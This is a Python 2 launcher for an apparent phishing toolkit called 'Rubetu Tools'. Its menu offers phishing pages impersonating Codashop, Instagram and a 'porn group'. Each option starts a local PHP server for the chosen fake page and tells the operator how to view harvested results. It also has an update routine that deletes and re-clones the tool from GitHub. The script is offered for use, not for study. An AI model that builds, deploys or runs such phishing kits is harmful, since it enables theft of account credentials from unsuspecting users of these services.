#coding=utf-8
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date

def warning(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.010)

# text banner
def banner(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
# text banner2
def banner2(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
def succes(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
def succes1(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
os.system('clear')
datet = '2021-07-11'
ExpirationDate = datetime.strptime(datet,"%Y-%m-%d").date()
now = date.today()
if ExpirationDate >= now:
    print('')
elif ExpirationDate == datet:
    print('')
else:
    warning('\033[1;33mPembaruan Berlaku!\n\n\033[1;37m\033[40;1mPlease update the tools to the latest version\n\nGithub: \033[0;32mhttps://github.com/Rubetu-Xcan/rubetu-tools\n\033[1;37mYoutube: \033[0;32mCandra NM\n\n')
    updating = raw_input("\033[1;37mUpdate Rubetu Tools Now?  (y/n) ")
    if updating == 'y' or updating == 'Y':
         os.system("cd && rm -r ruberu-tools")
         os.system("git clone https://github.com/Rubetu-Xcan/rubetu-tools")
         os.system("cd rubetu-tools")
         os.system("python2 rubetu-tools.py")
         time.sleep(1)
         sys.exit()
    elif updating == 'n' or updating == 'N':
            sys.exit()
    else:
            print('\033[1;31mWrong Input!')
            time.sleep(1)
            os.system('python2 rubetu-tools.py')
            sys.exit()

banner("""				\033[1;33m• \033[0;32m• \033[1;31m•		
\033[1;37m┌─┐┬ ┬┌─┐ ┌─┐┌┬┐┬ ┬   ┌┬┐┌─┐┌─┐┬  ┌─┐
├┬┘│ │├─┴┐├─  │ │ │ ━  │ │ ││ ││  └─┐
┴└─└─┘└──┘└─┘ ┴ └─┘    ┴ └─┘└─┘└─┘└─┘
\033[1;37m\033[41;1m \033[1;37mDeveloper: RubetuXcan │ Version 1.2 \033[00m\033[1;37m
\033[1;37m╾━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╼                                
\033[1;31m[\033[1;37m1\033[1;31m]\033[1;33m • \033[1;37mPhishing Codashop   (\033[0;32mOnline\033[1;37m)                            
\033[1;31m[\033[1;37m2\033[1;31m]\033[0;32m • \033[1;37mPhishing Instagram  (\033[0;32mOnline\033[1;37m)                       
\033[1;31m[\033[1;37m3\033[1;31m]\033[1;31m • \033[1;37mPhishing Grup Porn  (\033[0;32mOnline\033[1;37m)

\033[1;31m[\033[1;37m04\033[1;31m]\033[1;33m • \033[1;37mAbout This Tools                         
\033[1;31m[\033[1;37m05\033[1;31m]\033[0;32m • \033[1;37mExit Program                                           
\033[1;37m╾━━━━━━━━━━━━━━━━━━━━╼""")
pilih = raw_input("\033[1;31m • \033[1;37mChoice \033[1;31m: \033[0;32m")
if pilih == '1' or pilih == '01':
	port = raw_input("\033[1;31m • \033[1;37mPort \033[1;37m(\033[0;32mCodashop\033[1;37m)\033[1;31m : \033[0;32m")
	if port == '':
		print('\033[1;31m • \033[1;37mLink phishing\033[1;31m : \033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 sys.py')
	else:
		succes('\033[1;31m • \033[1;37mLink phishing\033[1;31m :\033[0;32m http://localhost:' + port)
		print("\n\nMelihat hasil dengan command:\ncd /codashop && php zorana.php\n\nAktifitas phishing (codashop):\n")
		os.system('php -S localhost:' + port + ' -t codashop')
		sys.exit()
if pilih == '2' or pilih == '02':
	port = raw_input("\033[1;31m • \033[1;37mPort \033[1;37m(\033[0;32mInstagram\033[1;37m)\033[1;31m : \033[0;32m")
	if port == '':
		print('\033[1;31m • \033[1;37mLink phishing\033[1;31m : \033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 sys.py')
	else:
		succes('\033[1;31m • \033[1;37mLink Phishing\033[1;31m :\033[0;32m http://localhost:' + port)
		print("\n\nMelihat hasil dengan command:\ncd /instagram && php zorana.php\n\nAktifitas phishing (Instagram) :\n")
		os.system('php -S localhost:' + port + ' -t instagram')
		sys.exit()
if pilih == '3' or pilih == '03':
	port = raw_input("\033[1;31m • \033[1;37mPort \033[1;37m(\033[0;32mGrup porn\033[1;37m)\033[1;31m : \033[0;32m")
	if port == '':
		print('\033[1;31m • \033[1;37mLink Phishing\033[1;31m : \033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 sys.py')
	else:
		succes('\033[1;31m • \033[1;37mLink Phishing\033[1;31m :\033[0;32m http://localhost:' + port)
		print("\n\nMelihat hasil dengan command:\ncd /porn && php zorana.php\n\nAktifitas phishing (Grup Porn) :\n")
		os.system('php -S localhost:' + port + ' -t porn')
		sys.exit()
if pilih == '4' or pilih == '04':
	print("Not Found!")
if pilih == '5' or pilih == '05':
	       sys.exit('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mExit Program')
else:
	       print('\033[1;31m • \033[1;37m\033[1;31mWrong Input!')
	       time.sleep(0.1)
	       os.system('python2 sys.py')
		
		
		